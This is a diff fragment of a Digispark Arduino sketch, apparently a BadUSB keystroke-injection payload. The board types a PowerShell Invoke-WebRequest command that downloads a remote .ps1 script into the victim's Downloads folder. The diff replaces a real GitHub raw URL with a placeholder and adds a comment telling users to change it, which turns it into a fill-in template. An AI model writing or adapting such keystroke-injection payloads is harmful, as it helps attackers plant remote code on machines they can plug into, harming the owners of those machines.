@@ -12,7 +12,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
 
-  DigiKeyboard.print(F("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/zehramans/salam001/main/wallpaper.ps1\" -OutFile \"$env:USERPROFILE\\Downloads\\githubscript.ps1\""));
+  DigiKeyboard.print(F("Invoke-WebRequest -Uri \"xxx\" -OutFile \"$env:USERPROFILE\\Downloads\\githubscript.ps1\"")); //change the Uri 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000); 
 
